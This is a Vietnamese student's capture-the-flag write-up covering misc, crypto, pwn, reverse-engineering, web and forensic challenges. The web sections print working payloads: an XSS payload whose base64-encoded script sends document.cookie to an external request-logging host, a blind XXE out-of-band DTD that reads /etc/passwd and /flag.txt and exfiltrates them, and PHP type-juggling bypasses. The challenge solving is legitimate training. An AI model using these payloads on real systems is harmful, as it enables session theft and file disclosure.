
Phùng Văn Tài - AT17A - MSV: AT170143

[PROG/MISC](#prog-misc)
[CRYPTO](#crypto)
[PWN](#pwn)
[RE](#re)
[WED](#web)
[FORENSIC](#forensic)




# BinggChillinggg {#prog-misc}
Prog/Misc

## Description:
> Đề cho một file zip: Bing.zip

## Solution:
sau khi tải file zip về mình thực hiện giải nén thì nhận thấy các bức ảnh này có vẻ như là từ một bức ảnh lớn hơn cắt nhỏ.
Script mình sử dụng để ghép các hình đó lại:
```python
from PIL import Image
import os

filenames = os.listdir('C:\\Users\\ADMIN\\Documents\\New folder\\Bingg\\')
filenames = [f for f in filenames if f.endswith('.png')]
images = []
for f in filenames:
    col, row = map(int, f.split("_")[1].split(".")[0].split("_"))
    images.append((col, row, Image.open(f)))

images.sort(key=lambda x: (x[0], x[1]))

widths, heights = zip(*(i.size for _, _, i in images))
max_col = max([col for col, _, _ in images])
max_row = max([row for _, row, _ in images])
total_width = max_col + 1
total_height = max_row + 1
result = Image.new('RGB', (total_width, total_height))

for col, row, im in images:
    result.paste(im, (col, row))

result.save('output.png')
```
sau khi chạy script thì mình có được ảnh này:
![img](./images/result3.jpg)

mặc dù thấy rõ hình người rồi nhưng chữ vẫn hơi lệch, không muốn mất thời gian nên mình đi con đường hơi tắt. không sửa lại code nữa mà ghép mấy phần chữ lại lấy flag luôn =)).

![img](./images/2.png)

flag: KCSC{Zao_shang_hao_zhong_gou!_Xian_zai_wo_you_bing_chilling!!}


# Tet_is_ya_best {#crypto}
Crypto

## Description:
> Đề bài cho một file chứa những văn bản đã bị mã hoá:  lyl, rwns dmsfm rn wkmrx myf iyrx pynljorw, jn luy ejvvynl lxrqjljsmrw pynljorw jm ojyl mrh.
lyl jn knkrwwi pxsh luy ymq sp trmkrxi ls yrxwi pyexkrxi. 
eypsxy lyl, ojylmrhyny cxycrxy hrmi lujmvn psx luy luxyy hrjm qrin. 
luyi gwyrm luyjx uskny rmq qygsxrly fjlu pwsfyxn nkgu rn dkhbkrl lxyy sx cyrgu ewsnnsh. 
r ukvy rhskml sp pssq fjww ey eskvul eypsxy lyl psx hrdjmv lxrqjljsmrw qjnuyn. ermu gukmv, ermu lyl, vjs gur, asj rmq hkl, …rmq grmqjyn rxy luy pssqn lurl hknl uroy sm lyl uswjqrin.
qkxjmv lyl, cyscwy ojnjl luyjx xywrljoyn’ ushyn rmq vjoy fjnuyn. 
usfyoyx, luy ojylmrhyny eywjyoy lurl luy pjxnl ojnjlsx r prhjwi xygyjoyn jm luy iyrx qylyxhjmyn luyjx psxlkmy psx luy ymljxy iyrx, cyscwy myoyx ymlyx rmi uskny sm luy pjxnl qri fjluskl eyjmv jmojlyq pjxnl. 
rmsluyx gknlsh jn vjojmv wkgdi hsmyi, fujgu jn ckl jmls r xyq ymoywscy rn r nihesw sp wkgd rmq fjnu psx r myf rvy. 
lxrqjljsmrwwi, ywqyxn fjww vjoy wkgdi hsmyi ls gujwqxym rmq luy swqynl cyscwy jm luy prhjwi. usfyoyx, msfrqrin, cyscwy grm vjoy jl ls rmismy jmgwkqjmv pxjymqn, crxymln, myjvuesxn,… 
eynjqyn, ojylmrhyny knkrwwi vs ls crvsqrn sx lyhcwyn ls cxri psx uyrwlu, fyrwlu, nkggynn,… 
ls ojylmrhyny, lyl jn luy urccjynl ljhy sp rww iyrx rxskmq, hyheyxn jm r prhjwi grm vrluyx lsvyluyx, fujgu jn r hyrmjmvpkw hynnrvyn sp wkmrx myf iyrx pynljorw. 
rww jm rww, lyl jn rww reskl ergd ls sxjvjmn, ey vssq ls sluyxn, ymtsi luy cxygjskn hshyml, rmq fjnu psx luy eynl ls gshy.
luy pwrv jn: dgng{lyl_lyl_lyl_lyl_qym_xsj__gukg_grg_erm_mrh_hsj_lurl_mujyk_nkg_dusy__wko_pxsh_wkwkkkkkkkkkkkk}

## Solution:

có thể thấy ngay dòng cuối cùng chính là flag =))

mình dùng công cụ này để xác định dạng mã hoá: Cipher Identifier and Analyzer - https://www.boxentriq.com/code-breaking/cipher-identifier

và biết được: Monoalphabetic Substitution Cipher

rồi sử dụng công cụ này để giải mã:  https://www.boxentriq.com/code-breaking/cryptogram

và đây là kết quả:

![img](./images/3.png)

flag: KCSC{tet_tet_tet_tet_den_roi_chuc_cac_ban_nam_moi_that_nhieu_suc_khoe_luv_from_luluuuuuuuuuuuu}



# Chuyến tàu vô tận
Crypto

## Description:
> Đề bài cho một file chứa dãy nhị phân như này:  01010011 00110001 01000010 01010100 01010110 01101011 00110101 01010110 01010011 01101011 01001010 01010011 01010101 00110000 01000110 01001111 01010001 00110000 01001110 01001101 01010001 01010101 01010110 01000010 01010010 01010101 01010110 01001000 01010011 00110000 01110100 01010000 01010110 01010101 00111001 01000110 01010100 00110000 01010110 01000010 01010110 01000110 01010010 01010101 01010100 00110001 01001110 01000110 01010101 00110001 01001010 01010000 01010111 01010110 01001010 01000111 01010100 01000110 01001110 01001010

## Solution:
dùng CyberChef giải mã binary và base64 mình được đoạn text này:  KPSVNUJBRSANCCLAEAEEGKKOUOEOEATTTOSESROYRFLSI

dùng công cụ sau để xác định dạng mã hoá: https://www.dcode.fr/cipher-identifier

sau nhiều lần thử quên ăn quên ngủ thì mình đã tìm thấy được dạng mã hoá đúng là Redefence cipher
đây là công cụ giải mã: https://www.dcode.fr/redefence-cipher

giải mã xong ta sẽ có được flag =))
![img](./images/4.png)



# EZENC
CRYPTO

## Description:
> đề bài cho file: chall.txt : 4e544d7a4d44526c4e5451314d544d7a4e7a51304e6a59794e6d51305a5463324e5745304e7a5a6a4e7a553159544d784d7a6b305954597a4d7a457a4f5451304e6a497a4d6a4d354e7a4d304f54557a4e4455324f4459324e54457a5a444e6b

## Solution:
với đoạn mã này thì mình dùng công cụ ciphey để giải mã nhanh và nhận được flag:

flag: KCSC{Encoding Is Cool!!!}







# CAT {#pwn}
Pwnable

## Description:
> đề bài cho một file elf: cat

## Solution:
chạy thử file cat thì nhận được dòng sau:

![img](./images/5.png)

tiếp theo, mình sử dụng một Binary Ninja để dịch ngược, và nhận thấy username và password:

![img](./images/6.png)

sau khi dùng thông tin trên để đăng nhập thì mình được hỏi phải nhập secret key
để ý trong binary ninja thì ở chỗ lấy dữ liệu secret key chứ 0x200 byte: read(fd: 0, buf: &secret, nbytes: 0x200)

mình đã thực hiện nhập một chuỗi thật dài để tạo hiệu ứng tràn.
và mình nhận được cờ luôn =))

![img](./images/7.png)

flag: KCSC{w3ll_d0n3_y0u_g0t_my_s3cr3t_n0w_d04942f299}



# Treasure
PWN

## Description:
> đề bài cho một file: treasure
> There are 3 parts of flag in the binary, try to obtain all parts and the real treasure will be reveal.

## Solution:
với bài này thì mình sử dụng BinaryNinja để dịch ngược và tìm cờ:

có thể thấy ngay Part 1: KCSC{

![img](./images/17.png)

Part 2 được in ra từ biến var_1f, vì vậy đổi giá trị var_1f từ hex sang string ta được: 4_t1ny_tr34sur3 phải đảo ngược lại

Part 3 thì thực hiện search trong mã nguồn là thấy luôn: _27651d2df78e1998}

![img](./images/18.png)

flag: KCSC{4_t1ny_tr34sur3_27651d2df78e1998}





# AntiDebug {#re}
REVERSE

## Description:
> đề bài cung cấp một file asm: 
```assembly
void __cdecl ENC(int a1, int a2, int a3, int a4)

push    ebp
mov     ebp, esp
mov     eax, [ebp+0Ch]
add     eax, [ebp+10h]
add     eax, [ebp+8]
mov     ecx, [ebp+14h]
add     ecx, 0Ah
xor     ecx, [ebp+8]
add     eax, ecx
xor     eax, [ebp+8]
push    eax             ; char
push    offset Format   ; "0x%x"
call    printf
add     esp, 8
pop     ebp
retn
```

## Solution:
Đề bài hỏi là kết quả khi gọi hàm: ENC(0xAB12DF34, 0x7B, 0x2D, 0x43) trả về cái gì?

từ đoạn code trên thì mình chuyển sang code c cho dễ nhìn sẽ như này:
```c
#include<stdio.h>
#include<string.h>

void __cdecl ENC(int a1, int a2, int a3, int a4) {
    int eax = a3;
    int ecx = a4 + 0xA;
    eax = eax + a2 + a1;
    ecx = ecx ^ a1;
    eax = eax + ecx;
    eax = eax ^ a1;
    printf("0x%x", eax);
}


int main(){
	ENC(0xAB12DF34, 0x7B, 0x2D, 0x43);
}
```

sau khi chạy chương trình thì được kết quả là: 0xfd376061

flag: KCSC{0xfd376061}





# HI HI HI {#web}
WED

## Description:
> đường dẫn: http://146.190.115.228:20109/

## Solution:
đầu tiên thì như tiêu đề của trang web đã gợi ý là XSS nên mình thực hiện intruder để tìm các payload có thể XSS, có rất nhiều payload có thể thực hiện được
mình sẽ sử dụng:

![img](./images/13.png)

sau đó áp dụng kĩ thuật này trên PayloadsAllTheThing để tiến hành sửa đổi lại payload cho phù hợp:

![img](./images/14.png)

bây giờ tạo một server để lắng nghe kết quả trả về: https://requestinspector.com/inspect/01gpz8y6v58m9y6f3kw8w5t91s

phần mã Javascript thực hiện gửi dữ liệu về server sẽ như sau: 
```javascript
var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "https://requestinspector.com/inspect/01gpz8y6v58m9y6f3kw8w5t91s", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send(document.cookie);
```

sau đó base64 mã javascript: ICAgIHZhciB4aHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgeGh0dHAub3BlbigiUE9TVCIsICJodHRwczovL3JlcXVlc3RpbnNwZWN0b3IuY29tL2luc3BlY3QvMDFncHo4eTZ2NThtOXk2ZjNrdzh3NXQ5MXMiLCB0cnVlKTsKICAgIHhodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgIHhodHRwLnNlbmQoZG9jdW1lbnQuY29va2llKTs=

payload sẽ được sửa thành:  <svg onload=eval(atob("ICAgIHZhciB4aHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgeGh0dHAub3BlbigiUE9TVCIsICJodHRwczovL3JlcXVlc3RpbnNwZWN0b3IuY29tL2luc3BlY3QvMDFncHo4eTZ2NThtOXk2ZjNrdzh3NXQ5MXMiLCB0cnVlKTsKICAgIHhodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgIHhodHRwLnNlbmQoZG9jdW1lbnQuY29va2llKTs="))>

sau đó nộp link thu được vào phần report là được rồi:  http://146.190.115.228:20109/?message=%3Csvg+onload%3Deval%28atob%28%22ICAgIHZhciB4aHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgeGh0dHAub3BlbigiUE9TVCIsICJodHRwczovL3JlcXVlc3RpbnNwZWN0b3IuY29tL2luc3BlY3QvMDFncHo4eTZ2NThtOXk2ZjNrdzh3NXQ5MXMiLCB0cnVlKTsKICAgIHhodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgIHhodHRwLnNlbmQoZG9jdW1lbnQuY29va2llKTs%3D%22%29%29%3E

đến đây không hiểu sao nộp link mãi không được, mình để ý thấy cái này:

![img](./images/15.png)

sửa đường dẫn thành http://127.0.0.1:13337/?message=<svg onload=eval(atob("ICAgIHZhciB4aHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgeGh0dHAub3BlbigiUE9TVCIsICJodHRwczovL3JlcXVlc3RpbnNwZWN0b3IuY29tL2luc3BlY3QvMDFncHo4eTZ2NThtOXk2ZjNrdzh3NXQ5MXMiLCB0cnVlKTsKICAgIHhodHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgIHhodHRwLnNlbmQoZG9jdW1lbnQuY29va2llKTs="))>

kiểm tra phía server ta nhận được flag:

![img](./images/16.png)

flag: Flag=KCSC{T3T_TU1_3_T13P_Hmmmmmmmm}




# Phpri Phprai
WED

## Description:
> http://47.254.251.2:8889

## Solution:
sau khi truy cập đường dẫn được cung cấp thì mình có được mã nguồn sau:
```php
<?php
    include 'config.php';
    show_source("index.php");
    error_reporting(0);
    if(isset($_GET["1"]) && isset($_GET["2"])) {
        $str1 = $_GET["1"];
        $str2 = $_GET["2"];
        if(($str1 !== $str2) && (md5($str1) == md5($str2))) {
            echo $flag1;
        }
    }
    if(isset($_GET["3"])) {
        if( strcmp( $_GET['3'], $$flag ) == 0) {
            echo $flag2;
        }
    }
    if(isset($_GET["4"])) {
        $str4 = $_GET["4"];
        $str4=trim($str4);
        if($str4 == '1.4e5' && $str4 !== '1.4e5') {
            echo $flag3;
        }
    }
    if(isset($_GET["5"])) {
        $str5 = $_GET["5"];
        if($str5 == 69 && $str5 !== '69' && $str5 !== 69 && strlen(trim($str5)) == 2) {
            echo $flag4;
        }
    }
    if(isset($_GET["6"])) {
        $str6 = $_GET["6"];
        $var1 = 'KaCeEtCe';
        $var2 = preg_replace("/$var1/", '', $str6);
        if($var1 === $var2) {
            echo $flag5;
        }
    }
?>
```

bài này khá đơn giản chỉ cần bypass qua các vòng if ở trên là lấy được từng phần của flag.
```php
if(isset($_GET["1"]) && isset($_GET["2"])) {
        $str1 = $_GET["1"];
        $str2 = $_GET["2"];
        if(($str1 !== $str2) && (md5($str1) == md5($str2))) {
            echo $flag1;
        }
    }
```
phần đầu tiên: cần truyền vào hai chuỗi str1, str2 khác nhau nhưng lại có md5 giống nhau, điều này khá kỳ lạ nhưng mình nghĩ nếu có thể làm cho md5 đều tạo thành null thì có thể thoả mã yêu cầu này. vì vậy mình truyền vào đây hai giá trị mảng.
> ?1[]=a&2[]=b

```php
if(isset($_GET["3"])) {
        if( strcmp( $_GET['3'], $$flag ) == 0) {
            echo $flag2;
        }
    }
```
phần thứ hai: ở đây thì cần làm cho hàm strcmp trả về 0, mình đã thử áp dụng tiếp cách dùng mảng như trên để tạo ra null thì nó lại thành công, khi so sánh null == 0 

```php
if(isset($_GET["4"])) {
        $str4 = $_GET["4"];
        $str4=trim($str4);
        if($str4 == '1.4e5' && $str4 !== '1.4e5') {
            echo $flag3;
        }
    }
```
phần thứ ba: ở đây để ý thì thấy hàm trim sẽ bỏ hết khoảng trắng nhập vào. phân tích một chút thì toán tử == thì toán tử so sánh theo giá trị, còn !== là phải cùng giá trị và kiểu dữ liệu nữa. vì vậy cách giải quyết của mình là: đổi 1.4e5 = 140000. khi đó với == thì về giá trị 140000 = 1.4e5 còn kiểu dữ liệu thì nó khác nhau một cái là số , một cái là chuỗi.

```php

    if(isset($_GET["5"])) {
        $str5 = $_GET["5"];
        if($str5 == 69 && $str5 !== '69' && $str5 !== 69 && strlen(trim($str5)) == 2) {
            echo $flag4;
        }
    }

```
phần thứ tư: phần này không khó, khá tương tự phần thứ 3, ý tưởng mình chỉ cần thêm một khoảng trắng ở trước 69 và truyền vào là được. " 69" chuyển sang số sẽ = "69", và " 69" chắc chắn khác về kiểu dữ liệu với "69" ....   sau đó đổi một chút, dùng urlencode để có thể truyền được khoảng trắng trên url: %2069

```php
    if(isset($_GET["6"])) {
        $str6 = $_GET["6"];
        $var1 = 'KaCeEtCe';
        $var2 = preg_replace("/$var1/", '', $str6);
        if($var1 === $var2) {
            echo $flag5;
        }
    }
```

phần thứ 5: ở đây sử dụng hàm preg_replace() để thay đổi chuỗi KaCeEtCe nhưng bắt buộc phải nhập được chuỗi này thì mới in ra được flag vì vậy, mình nghĩ chỉ cần bỏ KaCeEtCe vào giữ chuỗi nhập vào như này: KaCeKaCeEtCeEtCe => như vậy dù có bị thay thế thành rỗng thì chuỗi vẫn cứ là KaCeEtCe ban đầu.

payload cuối cùng: http://47.254.251.2:8889/?1[]=a&2[]=b&3[]=c&4=140000&5=%2069&6=KaCeKaCeEtCeEtCe

flag: KCSC{B0_u_Bu_S4C_8usssssss_https://www.youtube.com/watch?v=xQtC3F8fH6g}





# XXD
WED

## Description:
> Đường dẫn: http://146.190.115.228:13373/

## Solution:
sau khi truy cập trang web thì mình nhận được một cái survey, điền đủ thông tin và mình bắt lấy request được như sau:

![img](./images/8.png)

trang web thực hiện post thông tin trong xml, ngoài ra đề bài là XXD nên làm mình liên tưởng tới tấn công XXE.
sau một hồi tìm trên PayloadAllTheThings thì mình tìm thấy cái có thể khai thác được là : XXE OOB with DTD and PHP filter

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://127.0.0.1/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```

Tiếp theo, sử dụng: https://requestinspector.com/ để tạo một endpoint, mình lấy được một url: https://requestinspector.com/p/01gpz57s2z8f9cgqvgkqgxqn44  => mỗi khi truy cập vào link này dữ liệu sẽ được ghi lại

Tiếp theo tạo một pastebin với nội dung như sau:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://requestinspector.com/inspect/01gpz57s2z8f9cgqvgkqgxqn44?%data;'>">
```
=> đây là đừng dẫn của pastebin: https://pastebin.com/raw/TbthmPfv

sau cùng,  thay thế payload trên với url pastbin vừa tạo.
```
<?xml version="1.0" ?>

<!DOCTYPE r [

<!ELEMENT r ANY >

<!ENTITY % sp SYSTEM "https://pastebin.com/raw/TbthmPfv">

%sp;

%param1;

]>

<r>&exfil;</r>
```

![img](./images/9.png)

status trả về là 1 nên có vẻ như đã chính xác, và bài này là một bài blind nên ta quay lại server để xem kết quả

![img](./images/10.png)

giải mã base64: V2VsbCBkb25lISwgaGVyZSBpcyB0aGUgZmxhZzogS0NTQ3tibGluZF94eERfeHhPX3h4XV94eGUhIUAjQH0K ta thu được flag

flag: KCSC{blind_xxD_xxO_xx]_xxe!!@#@}


# MAIL {#forensic}
FORENSIC

## Description:
> đề bài cho một file: mail.mbox

## Solution:
bài này mình nộp không kịp.
mở file này bằng công ục MBOX Viewer

![img](./images/11.png)

ở đoạn tin nhắn này, để ý thấy có đính kèm một file pdf đồng thời có một công là phải tải tài liệu này xuống nên mình nghĩ là phải tải file xuống và tìm flag trong file.
sau khi tải xuống, đầu tiền mình dùng luôn strings thì tìm thấy flag =))

![img](./images/12.png)

flag: KCSC{Anata_n0_baka_aho_aho_>///<}
